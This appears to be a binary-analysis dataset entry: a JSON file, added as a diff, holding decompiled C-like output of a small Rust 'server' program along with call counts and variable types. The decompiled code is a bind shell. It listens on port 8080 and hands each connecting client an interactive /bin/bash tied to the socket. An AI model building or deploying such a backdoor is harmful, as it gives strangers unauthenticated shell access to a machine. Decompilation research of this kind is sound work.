@@ -1,0 +1,158 @@
+{
+  "decompilation": {
+    "_ZN6server4main17h71f534badac070e5E": "void _ZN6server4main17h71f534badac070e5E(void)\n\n{\n  int local_c4;\n  undefined4 local_c0;\n  int local_bc;\n  int *local_b8;\n  undefined **local_b0;\n  undefined8 local_a8;\n  undefined **local_a0;\n  undefined8 local_98;\n  undefined8 uStack_90;\n  undefined *local_80;\n  code *local_78;\n  int *local_70;\n  code *local_68;\n  int local_60 [4];\n  undefined local_50 [32];\n  \n  _ZN3std3net3tcp11TcpListener4bind17h6878a6b6f0b0ddd4E(&local_b0,\"192.168.0.9:8080\",0x10);\n  local_c4 = _ZN4core6result19Result_LT_T_C_E_GT_6expect17h9fdd00db71c10f1aE(&local_b0);\n  local_b0 = &PTR_s_Listening_on_port_8080____0016b688;\n  local_a8 = 1;\n  local_a0 = (undefined **)0x1562d0;\n  local_98 = 0;\n  uStack_90 = 0;\n                    /* try { // try from 0010ddbf to 0010ddc9 has its CatchHandler @ 0010dec8 */\n  (*(code *)PTR__ZN3std2io5stdio6_print17h64077f6090d28911E_0016eb08)(&local_b0);\n  local_bc = 0;\n  local_b8 = &local_c4;\n  while( true ) {\n                    /* try { // try from 0010de00 to 0010de20 has its CatchHandler @ 0010decc */\n    (*(code *)\n      PTR__ZN82__LT_std__net__tcp__Incoming_u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17hf6f55b5493f73e35E_0016ede0\n    )(local_60,&local_b8);\n    if (local_60[0] == 2) break;\n    local_c0 = _ZN4core6result19Result_LT_T_C_E_GT_6expect17h3dae975375e4873fE(local_60);\n                    /* try { // try from 0010de25 to 0010de8f has its CatchHandler @ 0010ded1 */\n    (*(code *)PTR__ZN3std3net3tcp9TcpStream9peer_addr17h16381829ee6ca785E_0016ed60)\n              (&local_b0,&local_c0);\n    _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h37345e45b95a9fadE(local_50,&local_b0);\n    local_78 = \n    _ZN73__LT_core__net__socket_addr__SocketAddr_u20_as_u20_core__fmt__Display_GT_3fmt17h08ec6da075bafa7bE\n    ;\n    local_70 = &local_bc;\n    local_68 = \n    _ZN4core3fmt3num3imp52__LT_impl_u20_core__fmt__Display_u20_for_u20_i32_GT_3fmt17h55f9e13eb244e3e4E\n    ;\n    local_b0 = (undefined **)&DAT_0016b6b0;\n    local_a8 = 3;\n    uStack_90 = 0;\n    local_98 = 2;\n    local_a0 = &local_80;\n    local_80 = local_50;\n    _ZN3std2io5stdio6_print17h64077f6090d28911E(&local_b0);\n                    /* try { // try from 0010de94 to 0010dea3 has its CatchHandler @ 0010deca */\n    _ZN3std6thread5spawn17hd809fa612a707511E(&local_b0,local_c0);\n    _ZN4core3ptr60drop_in_place_LT_std__thread__JoinHandle_LT__LP__RP__GT__GT_17h99b68376bec15c1aE\n              (&local_b0);\n    local_bc = local_bc + 1;\n  }\n  _ZN4core3ptr45drop_in_place_LT_std__net__tcp__TcpStream_GT_17haee64bd767160edcE(local_c4);\n  return;\n}",
+    "_ZN6server13handle_client17h0b21350cc7b22776E": "void _ZN6server13handle_client17h0b21350cc7b22776E(int param_1)\n\n{\n  undefined8 uVar1;\n  undefined4 uVar2;\n  undefined local_11c [28];\n  undefined local_100 [32];\n  undefined local_e0 [208];\n  \n                    /* try { // try from 0010dc4c to 0010dc61 has its CatchHandler @ 0010dd32 */\n  _ZN3std7process7Command3new17h5eb91abcf33374d6E(local_e0,\"/bin/bash\",9);\n                    /* try { // try from 0010dc62 to 0010dce2 has its CatchHandler @ 0010dd37 */\n  uVar1 = _ZN3std7process7Command3arg17h92aa95d0ce24437cE(local_e0,\"-i\",2);\n  uVar2 = (*(code *)\n            PTR__ZN81__LT_std__sys__pal__unix__fd__FileDesc_u20_as_u20_std__os__fd__raw__FromRawFd_GT_11from_raw_fd17h284301365c5ddf25E_0016ef10\n          )(param_1);\n  uVar1 = _ZN3std7process7Command5stdin17he98e54bf20c0f4f0E(uVar1,3,uVar2);\n  uVar2 = (*(code *)\n            PTR__ZN81__LT_std__sys__pal__unix__fd__FileDesc_u20_as_u20_std__os__fd__raw__FromRawFd_GT_11from_raw_fd17h284301365c5ddf25E_0016ef10\n          )(param_1);\n  uVar1 = _ZN3std7process7Command6stdout17h3421f856f44c7056E(uVar1,3,uVar2);\n  uVar2 = (*(code *)\n            PTR__ZN81__LT_std__sys__pal__unix__fd__FileDesc_u20_as_u20_std__os__fd__raw__FromRawFd_GT_11from_raw_fd17h284301365c5ddf25E_0016ef10\n          )(param_1);\n  uVar1 = _ZN3std7process7Command6stderr17h778f9adf69fa6ef6E(uVar1,3,uVar2);\n  (*(code *)PTR__ZN3std7process7Command5spawn17h5a66dce7a1b6416aE_0016ef38)(local_100,uVar1);\n  _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h3a1e058414a6c9ecE(local_11c,local_100);\n                    /* try { // try from 0010dce3 to 0010dcfc has its CatchHandler @ 0010dd23 */\n  (*(code *)PTR__ZN3std7process5Child4wait17h9eaa6dd104164a58E_0016eda8)(local_100,local_11c);\n  _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h355d22e1d7af9bcbE(local_100);\n                    /* try { // try from 0010dcfd to 0010dd06 has its CatchHandler @ 0010dd37 */\n  _ZN4core3ptr40drop_in_place_LT_std__process__Child_GT_17ha239f9afbc4a57d3E(local_11c);\n                    /* try { // try from 0010dd07 to 0010dd10 has its CatchHandler @ 0010dd32 */\n  _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h62424edbded0113aE(local_e0);\n  _ZN4core3ptr45drop_in_place_LT_std__net__tcp__TcpStream_GT_17haee64bd767160edcE(param_1);\n  return;\n}"
+  },
+  "function_call_counts": {
+    "_ZN6server4main17h71f534badac070e5E": {
+      "core::result::Result<T,E>::expect": 1,
+      "core::ptr::drop_in_place<std::thread::JoinHandle<()>>": 1,
+      "std::io::stdio::_print": 1,
+      "std::thread::spawn": 1,
+      "std::net::tcp::TcpListener::bind": 1,
+      "core::ptr::drop_in_place<std::net::tcp::TcpStream>": 1,
+      "core::result::Result<T,E>::unwrap": 1
+    },
+    "_ZN6server13handle_client17h0b21350cc7b22776E": {
+      "std::process::Command::arg": 1,
+      "core::ptr::drop_in_place<std::process::Child>": 1,
+      "core::result::Result<T,E>::unwrap": 1,
+      "std::process::Command::stderr": 1,
+      "std::process::Command::new": 1,
+      "std::process::Command::stdin": 1,
+      "std::process::Command::stdout": 1,
+      "core::ptr::drop_in_place<std::process::Command>": 1,
+      "core::ptr::drop_in_place<std::net::tcp::TcpStream>": 1
+    }
+  },
+  "macro_call_counts": {
+    "_ZN6server4main17h71f534badac070e5E": {},
+    "_ZN6server13handle_client17h0b21350cc7b22776E": {}
+  },
+  "variable_types": {
+    "_ZN6server4main17h71f534badac070e5E": {
+      "stack_8": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_20": [
+        [
+          "&reference",
+          8
+        ]
+      ],
+      "stack_52": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_44": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_76": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_92": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_84": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_28": [
+        [
+          "primitive",
+          8
+        ]
+      ],
+      "stack_100": [
+        [
+          "array",
+          16
+        ]
+      ],
+      "stack_4": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_68": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_0": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_12": [
+        [
+          "&primitive",
+          8
+        ]
+      ],
+      "stack_116": [
+        [
+          "array",
+          32
+        ]
+      ],
+      "stack_36": [
+        [
+          "&reference",
+          8
+        ]
+      ]
+    },
+    "_ZN6server13handle_client17h0b21350cc7b22776E": {
+      "reg_rax": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "reg_rdi": [
+        [
+          "primitive",
+          4
+        ]
+      ],
+      "stack_60": [
+        [
+          "array",
+          208
+        ]
+      ],
+      "stack_28": [
+        [
+          "array",
+          32
+        ]
+      ],
+      "stack_0": [
+        [
+          "array",
+          28
+        ]
+      ]
+    }
+  }
+}
